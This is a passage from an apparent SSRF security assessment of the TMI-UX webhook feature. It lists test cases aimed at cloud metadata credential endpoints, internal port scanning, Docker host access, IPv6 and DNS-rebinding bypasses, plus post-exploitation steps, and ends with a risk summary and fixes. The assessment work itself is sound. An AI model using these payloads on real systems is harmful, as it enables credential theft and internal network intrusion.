- [ ] Create note in threat model
- [ ] Check delivery logs via `GET /webhooks/deliveries`
- [ ] Expected: Error message indicating connection attempt

**Test Case 3: Cloud Metadata Extraction (AWS)**
- [ ] Create webhook: `https://169.254.169.254/latest/meta-data/`
- [ ] Trigger webhook
- [ ] Check if `status: delivered` (indicates successful request)
- [ ] Create second webhook: `https://169.254.169.254/latest/meta-data/iam/security-credentials/`
- [ ] Extract role name from error messages or timing

**Test Case 4: Internal Port Scanning**
- [ ] Create webhooks for `https://10.0.0.1:{port}/` where port ∈ [22, 80, 443, 3000, 5432, 8080]
- [ ] Trigger all webhooks via note creation
- [ ] Analyze delivery logs for each port
- [ ] Map open/closed ports based on error messages

**Test Case 5: Docker Host Access**
- [ ] Create webhook: `https://host.docker.internal:3000/`
- [ ] Trigger webhook
- [ ] Check if request reaches host machine

**Test Case 6: IPv6 Bypass Attempt**
- [ ] Create webhook: `https://[::ffff:169.254.169.254]/`
- [ ] Verify if validation accepts IPv6 notation
- [ ] Check delivery logs

**Test Case 7: DNS Rebinding (Advanced)**
- [ ] Register domain with attacker-controlled DNS
- [ ] Initial DNS: domain → public IP
- [ ] Create webhook: `https://attacker-domain.com/`
- [ ] Change DNS: domain → 169.254.169.254
- [ ] Trigger webhook after TTL expires
- [ ] Check if backend made request to metadata endpoint

**Test Case 8: Rate Limiting**
- [ ] Create webhook
- [ ] Trigger 100+ times rapidly via note creation
- [ ] Check if account or IP gets rate limited
- [ ] Document any throttling mechanisms

### Post-Exploitation Analysis

- [ ] Document all successful SSRF attempts with screenshots
- [ ] Extract any credentials or sensitive data from delivery logs
- [ ] Map internal network topology based on reconnaissance
- [ ] Identify which cloud platform backend runs on (AWS/GCP/Azure)
- [ ] Measure impact and potential privilege escalation paths

---

## 9. Conclusion

The TMI-UX application demonstrates a critical SSRF vulnerability in its webhook management functionality. While the Angular SPA architecture provides strong inherent protection against SSRF through client-side execution, the webhook feature introduces a server-side request mechanism that is exploitable due to:

1. **Insufficient URL validation** - Only HTTPS protocol enforcement, no IP/domain restrictions
2. **Missing authorization controls** - Route guard bypass allows any authenticated user access
3. **Multiple exploitation paths** - Test endpoint, event-based triggers, addon invocation
4. **Semi-blind feedback** - Delivery logs enable reconnaissance and information disclosure

**Risk Assessment:**
- **Likelihood:** HIGH (easy exploitation, low prerequisites)
- **Impact:** CRITICAL (cloud credentials, internal network access, data exfiltration)
- **Overall Risk:** CRITICAL

**External Exploitability:** ✅ CONFIRMED - Exploitable by any authenticated user via public internet

**Recommended Immediate Actions:**
1. Add `adminGuard` to `/admin/webhooks` route
2. Implement comprehensive backend URL validation
3. Deploy network egress filtering for webhook requests
4. Add rate limiting for webhook operations
5. Audit webhook delivery logs for suspicious activity

The exploitation phase should prioritize cloud metadata extraction and internal network reconnaissance to demonstrate full impact of these vulnerabilities.

---

**SSRF ANALYSIS COMPLETE**